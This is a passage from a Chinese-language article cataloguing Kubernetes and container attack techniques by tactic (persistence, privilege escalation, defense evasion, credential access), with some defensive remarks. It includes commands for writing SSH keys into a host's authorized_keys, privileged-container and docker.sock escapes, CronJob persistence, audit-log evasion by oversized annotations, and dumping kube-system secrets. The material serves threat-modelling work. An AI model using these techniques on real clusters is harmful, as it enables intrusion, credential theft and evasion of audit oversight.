class="hljs-number">0.234</span>:<span class="hljs-number">6443</span><span class="hljs-regexp">/api/</span>v1/nodes?watch  --header <span class="hljs-string">&quot;Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tOGprZmQiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2DydmljZS1hY2NvdW50LnVpZCI6Ijg4Y2ZmNmYzLWY0NzktMTFlOS1iZmY1LTJlYzU3MmZlMWRjOCIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.OU740qNcSf0Z__vAO1XJWUw9fvNNI2e4LxHypkpzREmnqrK9UZ-rrp9tG8Vxbc65FlPFj9efdpfWYExxjDDQwQTi-5Afmk4EA6EH-4vEs4V1r4gb0za8cyPVSAjzmEh7uIMgQHVo7y32V_BqUd8cmBoTdgnTY8Nx2QvMClvoYvEWvDKhbMnQjWH1x5Z6jK0iNg7btlK_WXnz8-yU2a0-jgoZFZ8D_qX16mZJ_ZoxEwPNTeNR8pP1l3ebZGVqBQA1PIFVG4HOlYomZya_DWGleMRYpulnECtBOTYyswzCwN8qJUVsdv6yWH1blWHKzYrkcoDmp2r6QhekaG1KFoX_YA&quot;</span> --cacert ca.crt<br></code></pre></td></tr></table></figure><h3 id="2-5-带有SSH服务的容器"><a href="#2-5-带有SSH服务的容器" class="headerlink" title="2.5 带有SSH服务的容器"></a>2.5 带有SSH服务的容器</h3><p>含有SSH服务的容器暴露了新的攻击面，由于暴力破解或者登录凭证泄露，攻击者可以进入到容器内部执行指令进行恶意操作。这种情况多见于自建容器或K8s环境(一些运维人员将容器当做VM使用)。此外当攻击者逃逸到node节点时可以通过添加账号或写入&#x2F;.ssh&#x2F;authorized_keys等方式利用SSH下发后续恶意指令。</p><h3 id="2-6-通过云厂商CloudShell下发指令"><a href="#2-6-通过云厂商CloudShell下发指令" class="headerlink" title="2.6 通过云厂商CloudShell下发指令"></a>2.6 通过云厂商CloudShell下发指令</h3><p>针对VM和容器服务的管理，云服务商往往会提供沙箱化的便捷管理工具，在云账号凭证泄露的情况下，攻击者可以通过云厂商提供的API接管集群。此外云厂商沙箱本身的安全问题也会影响到用户集群安全。<br>示例：通过Cloud Shell管理集群：</p><p><img src="https://ucc.alicdn.com/pic/developer-ecology/0b3a48e8bce64f899a7d4b1402e515b5.png" alt="5管理集群.png"></p><h2 id="3-Persistence-x2F-持久化"><a href="#3-Persistence-x2F-持久化" class="headerlink" title="3. Persistence&#x2F;持久化"></a>3. Persistence&#x2F;持久化</h2><h3 id="3-1-部署远控客户端"><a href="#3-1-部署远控客户端" class="headerlink" title="3.1 部署远控客户端"></a>3.1 部署远控客户端</h3><p>（参考2.3部分通过K8s控制器部署后门容器）攻击者通过K8s DaemonSet向每个Node中植入后门容器，这些容器可以设置为特权容器并通过挂载宿主机的文件空间来进一步向每个Node植入二进制并远控客户端，从而完成Node层持久化，且后续操作不会触发K8s层的审计策略。</p><h3 id="3-2-通过挂载目录向宿主机写入文件"><a href="#3-2-通过挂载目录向宿主机写入文件" class="headerlink" title="3.2 通过挂载目录向宿主机写入文件"></a>3.2 通过挂载目录向宿主机写入文件</h3><p>一种常见的容器逃逸方法，如果容器&#x2F;Pod启动时将VM的核心目录以写权限挂载(如&#x2F;root, &#x2F;proc, &#x2F;etc等)，则攻击者进入容器后可以修改敏感文件进行逃逸，如利用&#x2F;etc&#x2F;crontab执行定时任务、修改&#x2F;root&#x2F;.ssh&#x2F;authorized_keys获取SSH登录权限、读取其他进程空间内容等。<br>示例：不安全的目录挂载：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker run -it -v <span class="hljs-regexp">/root:/</span>root ubuntu <span class="hljs-regexp">/bin/</span>bash<br></code></pre></td></tr></table></figure><p>写入SSH凭证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">(<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n\n&quot;</span>;<span class="hljs-built_in">cat</span> id_rsa_new.pub) &gt;&gt; /root/.ssh/authorized_keys<br></code></pre></td></tr></table></figure><h3 id="3-3-K8s-cronjob持久化"><a href="#3-3-K8s-cronjob持久化" class="headerlink" title="3.3 K8s cronjob持久化"></a>3.3 K8s cronjob持久化</h3><p>Cronjob是K8s controller的一种，用于创建基于时间的调度任务(类似主机的&#x2F;etc&#x2F;crontab)。攻击者在获取controller create权限后可以创建cronjob实现持久化。</p><p>示例：cronjob持久化</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs scss">xy<span class="hljs-keyword">@x-</span><span class="hljs-number">8</span> ~/D/test&gt; cat cronjob.yaml<br><span class="hljs-attribute">apiVersion</span>: batch/v1beta1<br><span class="hljs-attribute">kind</span>: CronJob<br><span class="hljs-attribute">metadata</span>:<br>  <span class="hljs-attribute">name</span>: echotest<br><span class="hljs-attribute">spec</span>:<br>  <span class="hljs-attribute">schedule</span>: <span class="hljs-string">&quot;*/1 * * * *&quot;</span><br>  <span class="hljs-attribute">jobTemplate</span>:<br>    <span class="hljs-attribute">spec</span>:<br>      <span class="hljs-attribute">template</span>:<br>        <span class="hljs-attribute">spec</span>:<br>          <span class="hljs-attribute">containers</span>:<br>          - <span class="hljs-attribute">name</span>: container<br>            <span class="hljs-attribute">image</span>: nginx<br>            <span class="hljs-attribute">args</span>:<br>            - /bin/sh<br>            - -c<br>            - echo test<br>          <span class="hljs-attribute">restartPolicy</span>: OnFailure<br>xy<span class="hljs-keyword">@x-</span><span class="hljs-number">8</span> ~/D/test&gt; kubectl create -f cronjob.yaml<br>cronjob.batch/echotest created<br>xy<span class="hljs-keyword">@x-</span><span class="hljs-number">8</span> ~/D/test&gt; kubectl get cronjobs<br>NAME           SCHEDULE      SUSPEND   ACTIVE   LAST SCHEDULE   AGE<br>echotest       */<span class="hljs-number">1</span> * * * *   False     <span class="hljs-number">3</span>        <span class="hljs-number">26s</span>             <span class="hljs-number">3</span>m8s<br></code></pre></td></tr></table></figure><h3 id="3-4-在私有镜像库的镜像中植入后门"><a href="#3-4-在私有镜像库的镜像中植入后门" class="headerlink" title="3.4 在私有镜像库的镜像中植入后门"></a>3.4 在私有镜像库的镜像中植入后门</h3><p>（参考1.8私有镜像库暴露）攻击者在接管企业私有镜像库之后，可以进行拉取私有镜像窃取信息、删除仓库中的镜像、替换仓库中的镜像、为已有镜像添加后门、在镜像服务中创建后门账号等恶意操作。</p><p>一种持久化攻击方式是在dockerfile中加入额外的恶意指令层来执行恶意代码，同时该方法可以自动化并具有通用性。同时在Docker镜像的分层存储中，每一层的变化都将以文件的形式保留在image内部，一种更为隐蔽的持久化方式是直接编辑原始镜像的文件层，将镜像中原始的可执行文件或链接库文件替换为精心构造的后门文件之后再次打包成新的镜像，从而实现在正常情况下无行为，仅在特定场景下触发的持久化工具。</p><h3 id="3-5-修改核心组件访问权限"><a href="#3-5-修改核心组件访问权限" class="headerlink" title="3.5 修改核心组件访问权限"></a>3.5 修改核心组件访问权限</h3><p>攻击者通过ConfigMap修改Kubelet使其关闭认证并允许匿名访问，或暴露API Server的未授权HTTP接口，使其在后续渗透过程中拥有持续的后门命令通道。</p><h2 id="4-Privilege-Escalation-x2F-权限提升"><a href="#4-Privilege-Escalation-x2F-权限提升" class="headerlink" title="4. Privilege Escalation&#x2F;权限提升"></a>4. Privilege Escalation&#x2F;权限提升</h2><h3 id="4-1-利用特权容器逃逸"><a href="#4-1-利用特权容器逃逸" class="headerlink" title="4.1 利用特权容器逃逸"></a>4.1 利用特权容器逃逸</h3><p>Docker允许特权容器访问宿主机上的所有设备，同时修改AppArmor或SELinux的配置，使特权容器拥有与那些直接运行在宿主机上的进程几乎相同的访问权限。在这种情况下，攻击者从特权容器逃逸是极其容易实现的。</p><p>示例：将系统盘挂载到容器内部，读写宿主机文件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs awk">root@d000b330717d:/<span class="hljs-comment"># fdisk -l</span><br>Disk <span class="hljs-regexp">/dev/</span>vda: <span class="hljs-number">40</span> GiB, <span class="hljs-number">42949672960</span> bytes, <span class="hljs-number">83886080</span> sectors<br>Units: sectors of <span class="hljs-number">1</span> * <span class="hljs-number">512</span> = <span class="hljs-number">512</span> bytes<br>Sector size (logical<span class="hljs-regexp">/physical): 512 bytes /</span> <span class="hljs-number">512</span> bytes<br>I<span class="hljs-regexp">/O size (minimum/</span>optimal): <span class="hljs-number">512</span> bytes / <span class="hljs-number">512</span> bytes<br>Disklabel type: dos<br>Disk identifier: <span class="hljs-number">0</span>xe2eb87fa<br><br>Device     Boot Start      End  Sectors Size Id Type<br><span class="hljs-regexp">/dev/</span>vda1  *     <span class="hljs-number">2048</span> <span class="hljs-number">83886046</span> <span class="hljs-number">83883999</span>  <span class="hljs-number">40</span>G <span class="hljs-number">83</span> Linux<br>root@d000b330717d:<span class="hljs-regexp">/# mkdir /m</span>nt1<br>root@d000b330717d:<span class="hljs-regexp">/# mount /</span>dev<span class="hljs-regexp">/vda1 /m</span>nt1<br>root@d000b330717d:<span class="hljs-regexp">/# cd /m</span>nt1<br>root@d000b330717d:/mnt1<span class="hljs-comment"># ls</span><br>bin   etc         initrd.img.old  lost+found  opt   run   sys  var<br>boot  home        lib             media       proc  sbin  tmp  vmlinuz<br>dev   initrd.img  lib64           mnt         root  srv   usr  vmlinuz.old<br></code></pre></td></tr></table></figure><h3 id="4-2-K8s-Rolebinding添加用户权限"><a href="#4-2-K8s-Rolebinding添加用户权限" class="headerlink" title="4.2 K8s Rolebinding添加用户权限"></a>4.2 K8s Rolebinding添加用户权限</h3><p>K8s使用基于角色的访问控制(RBAC)来进行操作鉴权，允许管理员通过 Kubernetes API 动态配置策略。某些情况下运维人员为了操作便利，会对普通用户授予cluster-admin的角色，攻击者如果收集到该用户登录凭证后，可直接以最高权限接管K8s集群。少数情况下，攻击者可以先获取角色绑定(RoleBinding)权限，并将其他用户添加cluster-admin或其他高权限角色来完成提权。</p><h3 id="4-3-利用挂载目录逃逸"><a href="#4-3-利用挂载目录逃逸" class="headerlink" title="4.3 利用挂载目录逃逸"></a>4.3 利用挂载目录逃逸</h3><p>参考（3.2通过挂载目录向宿主机写入文件），攻击者在容器内部可以利用挂载通道修改宿主机文件来实现逃逸。</p><h3 id="4-4-利用操作系统内核漏洞逃逸"><a href="#4-4-利用操作系统内核漏洞逃逸" class="headerlink" title="4.4 利用操作系统内核漏洞逃逸"></a>4.4 利用操作系统内核漏洞逃逸</h3><p>操作系统内核安全（如Linux内核）是容器安全体系的基石，是实现容器隔离设计的前提。内核漏洞的利用往往从用户空间非法进入内核空间开始，在内核空间赋予当前或其他进程高权限以完成提权操作。在云原生场景中，云厂商会在VM层为操作系统内核漏洞进行补丁修复，避免用户被已公开的内核漏洞攻击。</p><h3 id="4-5-利用Docker漏洞逃逸"><a href="#4-5-利用Docker漏洞逃逸" class="headerlink" title="4.5 利用Docker漏洞逃逸"></a>4.5 利用Docker漏洞逃逸</h3><p>Docker软件历史上出现过多个高危安全漏洞，目前仍有一定影响的是两个2019年的漏洞：Docker runc RCE(CVE-2019-5736)和Docker cp RCE(CVE-2019-14271)。两个漏洞均利用了Docker本身的功能设计缺陷，利用覆盖容器内部runc文件、libnss库，从而实现从容器到宿主机的逃逸行为。从攻击者角度来看，这两个漏洞均需要与宿主机交互才会触发payload执行，实战中并不高效，但Docker既要隔离又要通信的机制设计或许会在未来暴露出更多问题。在云服务商提供的托管K8s集群以及Serverless服务中，Docker服务自身安全性会由云服务商维护，相比自建，安全性会更有保障。</p><h3 id="4-6-利用K8s漏洞进行提权"><a href="#4-6-利用K8s漏洞进行提权" class="headerlink" title="4.6 利用K8s漏洞进行提权"></a>4.6 利用K8s漏洞进行提权</h3><p>容器化基础设施每一环的软件漏洞都会带来安全风险。Kubernetes特权升级漏洞(CVE-2018-1002105)允许普通用户在一定前提下提升至K8s API Server的最高权限。该漏洞需要用户拥有对某个namespace下pod的操作权限，同时需要client到API Server和kubelet的网络通路来实施攻击。同样，该漏洞在云服务中已经被服务商修复，在自建的K8s集群中仍有发挥空间。</p><h3 id="4-7-容器内访问docker-sock逃逸"><a href="#4-7-容器内访问docker-sock逃逸" class="headerlink" title="4.7 容器内访问docker.sock逃逸"></a>4.7 容器内访问docker.sock逃逸</h3><p>当docker.sock被挂载到容器内部时，攻击者可以在容器内部访问该socket，管理docker daemon。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker -v <span class="hljs-regexp">/var/</span>run<span class="hljs-regexp">/docker.sock:/</span>var<span class="hljs-regexp">/run/</span>docker.sock<br></code></pre></td></tr></table></figure><p>此时容器内部可以与docker deamon通信，并另起一个高权限的恶意容器，从而拿到root shell。<br>示例：与docker deamon通信：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">find</span> / -name docker.sock<br>curl --unix-socket <span class="hljs-regexp">/var/</span>run<span class="hljs-regexp">/docker.sock http:/</span><span class="hljs-regexp">/127.0.0.1/</span>containers/json<br></code></pre></td></tr></table></figure><h3 id="4-8-利用Linux-Capabilities逃逸"><a href="#4-8-利用Linux-Capabilities逃逸" class="headerlink" title="4.8 利用Linux Capabilities逃逸"></a>4.8 利用Linux Capabilities逃逸</h3><p>容器即隔离，容器在设计上使用cgroup、namespace等对宿主机的资源进行隔离及调度使用，同时也支持使用Linux capabilities做细粒度的权限管控。从这一角度来看，不安全的权限分配会为容器逃逸提供通路。<br>示例：K8s YAML配置中对capabilities的支持：</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">securityContext</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">capabilities</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">drop</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">ALL</span><br>    <span class="hljs-attribute">add</span><span class="hljs-punctuation">:</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">NET_BIND_SERVICE</span><br></code></pre></td></tr></table></figure><p>docker会以白名单方式赋予容器运行所需的capabilities权限，我们可以在docker run命令中使用 –cap-add 以及 –cap-drop 参数控制capabilities。以下命令对容器开放了宿主机的进程空间，同时赋予容器CAP_SYS_PTRACE权限，此时攻击者在容器内部可以注入宿主机进程从而实现逃逸。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">docker <span class="hljs-built_in">run</span> -it <span class="hljs-attribute">--pid</span>=host <span class="hljs-attribute">--cap-add</span>=CAP_SYS_PTRACE ubuntu<br></code></pre></td></tr></table></figure><h2 id="5-Defense-Evasion-x2F-防御逃逸"><a href="#5-Defense-Evasion-x2F-防御逃逸" class="headerlink" title="5. Defense Evasion&#x2F;防御逃逸"></a>5. Defense Evasion&#x2F;防御逃逸</h2><h3 id="5-1-容器及宿主机日志清理"><a href="#5-1-容器及宿主机日志清理" class="headerlink" title="5.1 容器及宿主机日志清理"></a>5.1 容器及宿主机日志清理</h3><p>攻击者在获得一定权限之后，可以擦除容器内部及宿主机的系统日志以及服务日志，为企业的入侵事件复盘以及溯源增加难度。目前容器运行时安全解决方案中均采用实时的日志采集、自保护方案以及日志采集异常的预警，来解决日志恶意擦除导致的溯源问题。同时，在云原生的容器攻防战场中，恶意卸载安全产品agent以切断日志采集能力也逐渐成为了常见的攻击方式。</p><h3 id="5-2-K8s-Audit日志清理"><a href="#5-2-K8s-Audit日志清理" class="headerlink" title="5.2 K8s Audit日志清理"></a>5.2 K8s Audit日志清理</h3><p>Kubernetes Audit功能提供了与安全相关的按时间顺序排列的记录集，记录单个用户、管理员或系统其他组件影响系统的活动顺序。日志提供了包括事件、时间、用户、作用对象、发起者、执行结果等详细信息，为运行时安全审计提供便利。攻击者可以通过清理本地日志文件(用户&#x2F;服务商可自定义位置)以及切断服务商&#x2F;安全产品的日志上传通道(卸载agent或者阻断网络通路)来隐藏对K8s集群的操作，一些容器安全产品通过K8s AuditSink功能将日志导出到外部审计，也可通过修改K8s配置进行开启或关闭。</p><p>示例：阿里云容器服务Kubernetes Audit审计中心：</p><p><img src="https://ucc.alicdn.com/pic/developer-ecology/ac0559d4ac104a699b30f359f0816667.png" alt="6审计中心.png"></p><h3 id="5-3-利用系统Pod伪装"><a href="#5-3-利用系统Pod伪装" class="headerlink" title="5.3 利用系统Pod伪装"></a>5.3 利用系统Pod伪装</h3><p>K8s在部署时会在kube-system namespace中内置一些常见的功能性pod。在云厂商提供的容器服务中，集群还会默认携带一些云服务的组件(如日志采集、性能监控的agent)。攻击者可以利用常见的K8s内置pod作为后门容器，或将后门代码植入这些pod来实现隐蔽的持久化。<br>示例：阿里云托管版K8s服务内置pod：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">xy</span>@x-<span class="hljs-number">8</span> ~/D/test&gt; kubectl get deployments --namespace=kube-system<br><span class="hljs-attribute">NAME</span>                              READY   UP-TO-DATE   AVAILABLE   AGE<br><span class="hljs-attribute">alibaba</span>-log-controller            <span class="hljs-number">1</span>/<span class="hljs-number">1</span>     <span class="hljs-number">1</span>            <span class="hljs-number">1</span>           <span class="hljs-number">183</span>d<br><span class="hljs-attribute">alicloud</span>-application-controller   <span class="hljs-number">1</span>/<span class="hljs-number">1</span>     <span class="hljs-number">1</span>            <span class="hljs-number">1</span>           <span class="hljs-number">183</span>d<br><span class="hljs-attribute">alicloud</span>-disk-controller          <span class="hljs-number">1</span>/<span class="hljs-number">1</span>     <span class="hljs-number">1</span>            <span class="hljs-number">1</span>           <span class="hljs-number">183</span>d<br><span class="hljs-attribute">alicloud</span>-monitor-controller       <span class="hljs-number">1</span>/<span class="hljs-number">1</span>     <span class="hljs-number">1</span>            <span class="hljs-number">1</span>           <span class="hljs-number">183</span>d<br><span class="hljs-attribute">aliyun</span>-acr-credential-helper      <span class="hljs-number">1</span>/<span class="hljs-number">1</span>     <span class="hljs-number">1</span>            <span class="hljs-number">1</span>           <span class="hljs-number">183</span>d<br><span class="hljs-attribute">coredns</span>                           <span class="hljs-number">2</span>/<span class="hljs-number">2</span>     <span class="hljs-number">2</span>            <span class="hljs-number">2</span>           <span class="hljs-number">183</span>d<br><span class="hljs-attribute">metrics</span>-server                    <span class="hljs-number">1</span>/<span class="hljs-number">1</span>     <span class="hljs-number">1</span>            <span class="hljs-number">1</span>           <span class="hljs-number">183</span>d<br><span class="hljs-attribute">nginx</span>-ingress-controller          <span class="hljs-number">2</span>/<span class="hljs-number">2</span>     <span class="hljs-number">2</span>            <span class="hljs-number">2</span>           <span class="hljs-number">183</span>d<br><span class="hljs-attribute">tiller</span>-deploy                     <span class="hljs-number">1</span>/<span class="hljs-number">1</span>     <span class="hljs-number">1</span>            <span class="hljs-number">1</span>           <span class="hljs-number">183</span>d<br></code></pre></td></tr></table></figure><h3 id="5-4-通过代理或匿名网络访问K8s-API-Server"><a href="#5-4-通过代理或匿名网络访问K8s-API-Server" class="headerlink" title="5.4 通过代理或匿名网络访问K8s API Server"></a>5.4 通过代理或匿名网络访问K8s API Server</h3><p>利用代理或匿名网络执行攻击是常见的反溯源行为，在K8s Audit日志中记录了每个行为发起者的源IP，通过公网访问API Server的IP将会被记录并触发异常检测和威胁情报的预警。</p><p>示例：K8s Audit日志对pod exec行为的记录：</p><p><img src="https://ucc.alicdn.com/pic/developer-ecology/754d178ab24f497b826d72cef499ef77.png" alt="7行为的记录.png"></p><h3 id="5-5-清理安全产品Agent"><a href="#5-5-清理安全产品Agent" class="headerlink" title="5.5 清理安全产品Agent"></a>5.5 清理安全产品Agent</h3><p>目前主流容器运行时的安全产品部署方式有两种：平行容器模式和主机agent模式。前者创建安全容器采集pod、K8s集群日志以及实现网络代理；后者在VM层对容器层的进程网络文件进行采集。攻击者在获取到集群管理权限或逃逸到宿主机时，可以通过清理掉安全产品植入的探针，破坏日志完整性，使后续攻击行为无法被审计工具发现。在这一过程中，安全容器或主机agent异常离线往往会触发保护性告警。</p><h3 id="5-6-创建影子API-Server"><a href="#5-6-创建影子API-Server" class="headerlink" title="5.6 创建影子API Server"></a>5.6 创建影子API Server</h3><p>攻击者可以复制原生API Server的配置，修改关键参数（例如关闭认证，允许匿名访问，使用HTTP请求），再使用这些修改过的参数创建Pods。攻击者可以通过这个影子API Server直接获取etcd内存储的内容，使后续渗透行为在审计日志中匿名。</p><h3 id="5-7-创建超长annotations使K8s-Audit日志解析失败"><a href="#5-7-创建超长annotations使K8s-Audit日志解析失败" class="headerlink" title="5.7 创建超长annotations使K8s Audit日志解析失败"></a>5.7 创建超长annotations使K8s Audit日志解析失败</h3><p>一般情况下云厂商&#x2F;安全产品会使用自身日志服务的agent对K8s Audit日志进行采集和解析，以便于与后续审计规则结合。在入侵检测中，日志的采集-存储-计算的过程会受限于agent的性能占用、Server端日志服务以及其他云产品&#x2F;开源组件对存储和计算的限制，过长的字段将有可能触发截断，导致敏感信息无法经过审计规则从而绕过入侵检测，K8s API请求中允许携带1.5MiB的数据，但在Google StackDriver日志服务仅允许解析256KB的内容，这将导致Audit日志中的敏感信息(如创建Pod时的磁盘挂载配置项)绕过审计。</p><p>示例：通过无意义的超长annotations攻击日志分析链路：</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">apiVersion</span><span class="hljs-punctuation">:</span> <span class="hljs-string">v1</span><br><span class="hljs-attribute">kind</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attribute">metadata</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">annotations-bypass</span><br>  <span class="hljs-attribute">annotations</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">useless-key</span><span class="hljs-punctuation">:</span> <span class="hljs-string">useless-value(1 MiB)</span><br>...<br></code></pre></td></tr></table></figure><h2 id="6-Credential-Access-x2F-窃取凭证"><a href="#6-Credential-Access-x2F-窃取凭证" class="headerlink" title="6. Credential Access&#x2F;窃取凭证"></a>6. Credential Access&#x2F;窃取凭证</h2><h3 id="6-1-K8s-Secret泄露"><a href="#6-1-K8s-Secret泄露" class="headerlink" title="6.1 K8s Secret泄露"></a>6.1 K8s Secret泄露</h3><p>K8s使用Secret对象对access key、密码、OAuth token和ssh key等敏感信息进行统一管理。pod定义时可以引用secret对象以便在运行时访问。攻击者可以通过pod内部service account或更高权限用户来获取这些secret内容，从中窃取其他服务的通信凭证。<br>示例：查看并下载K8s secret保存的凭据：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">xy@x<span class="hljs-number">-8</span> ~&gt; kubectl <span class="hljs-built_in">get</span> secrets <span class="hljs-comment">--namespace=kube-system</span><br>NAME                                             TYPE                                  DATA   AGE<br>admin-<span class="hljs-keyword">token</span>-ltbcr                                kubernetes.io/service-account-<span class="hljs-keyword">token</span>   <span class="hljs-number">3</span>      <span class="hljs-number">184</span>d<br>alibaba-<span class="hljs-built_in">log</span>-controller-<span class="hljs-keyword">token</span><span class="hljs-number">-9</span>kv4m               kubernetes.io/service-account-<span class="hljs-keyword">token</span>   <span class="hljs-number">3</span>      <span class="hljs-number">184</span>d<br>aliyun-acr-credential-helper-<span class="hljs-keyword">token</span>-vwmlw         kubernetes.io/service-account-<span class="hljs-keyword">token</span>   <span class="hljs-number">3</span>      <span class="hljs-number">184</span>d<br>attachdetach-controller-<span class="hljs-keyword">token</span>-l5bfh              kubernetes.io/service-account-<span class="hljs-keyword">token</span>   <span class="hljs-number">3</span>      <span class="hljs-number">184</span>d<br>bootstrap-signer-<span class="hljs-keyword">token</span>-qbrx7                     kubernetes.io/service-account-<span class="hljs-keyword">token</span>   <span class="hljs-number">3</span>      <span class="hljs-number">184</span>d<br>bootstrap-<span class="hljs-keyword">token</span><span class="hljs-number">-509e2</span>b                           bootstrap.kubernetes.io/<span class="hljs-keyword">token</span>         <span class="hljs-number">6</span>      <span class="hljs-number">184</span>d<br>certificate-controller-<span class="hljs-keyword">token</span>-dgpjn               kubernetes.io/service-account-<span class="hljs-keyword">token</span>   <span class="hljs-number">3</span>      <span class="hljs-number">184</span>d<br>cloud-node-controller-<span class="hljs-keyword">token</span><span class="hljs-number">-647</span>sw                kubernetes.io/service-account-<span class="hljs-keyword">token</span>   <span class="hljs-number">3</span>      <span class="hljs-number">184</span>d<br>...<br>xy@x<span class="hljs-number">-8</span> ~&gt; kubectl <span class="hljs-built_in">get</span> secret alibaba-<span class="hljs-built_in">log</span>-controller-<span class="hljs-keyword">token</span><span class="hljs-number">-9</span>kv4m <span class="hljs-comment">--namespace=kube-system -o yaml</span><br></code></pre></td></tr></table></figure><h3 id="6-2-云产品AK泄露"><a href="#6-2-云产品AK泄露" class="headerlink" title="6.2 云产品AK泄露"></a>6.2 云产品AK泄露</h3><p>云原生的应用部署流程中会涉及到各种云产品的API通信，当某应用被攻破后，攻击者可以通过K8s secret或者挂载到本地的凭证文件来获取相关服务的AK并进行横向移动。一种常见的场景是：入侵WEB应用后获取云存储(OSS)、云数据库(RDS)、日志服务的通信凭证，并进一步窃取数据。</p><p>示例：关于云产品AK的扫描规则已被工具化：</p><p><img src="https://ucc.alicdn.com/pic/developer-ecology/9d2e5fe3f5cf442bb44212a216711dd1.png" alt="8工具化.png"></p><h3 id="6-3-K8s-Service-Account凭证泄露"><a href="#6-3-K8s-Service-Account凭证泄露" class="headerlink" title="6.3 K8s Service Account凭证泄露"></a>6.3 K8s Service Account凭证泄露</h3><p>此类场景多见于办公网运维PC、跳板机以及通过SSH管理的master节点上。黑客在攻破此类服务器时，可以检查本地是否存在kubectl鉴权所需的配置文件(一般在$HOME&#x2F;.kube&#x2F;config)，该文件通常包含了登录K8s集群的全部信息。</p><h3 id="6-4-应用层API凭证泄露"><a href="#6-4-应用层API凭证泄露" class="headerlink" title="6.4 应用层API凭证泄露"></a>6.4 应用层API凭证泄露</h3><p>在复杂业务场景以及微服务架构中，K8s各个服务之间、容器与VM之间会通过API方式进行通信，窃取其通信凭证可用于横向渗透。</p><h3 id="6-5-利用K8s准入控制器窃取信息"><a href="#6-5-利用K8s准入控制器窃取信息" class="headerlink" title="6.5 利用K8s准入控制器窃取信息"></a>6.5 利用K8s准入控制器窃取信息</h3><p>K8s准入控制器(Admission Controller)用于hook客户端对API Server的请求。其中变更(mutating)控制器可以修改被其接受的对象；验证(validating)控制器可以审计并判断是否允许该请求通过。准入控制器是可以串联的，在请求到达API Server之前，如有任何一个控制器拒绝了该请求，则整个请求将立即被拒绝，并向终端用户返回一个错误。</p><p>为了便于用户部署自己的准入服务，K8s提供了动态准入控制(Admission 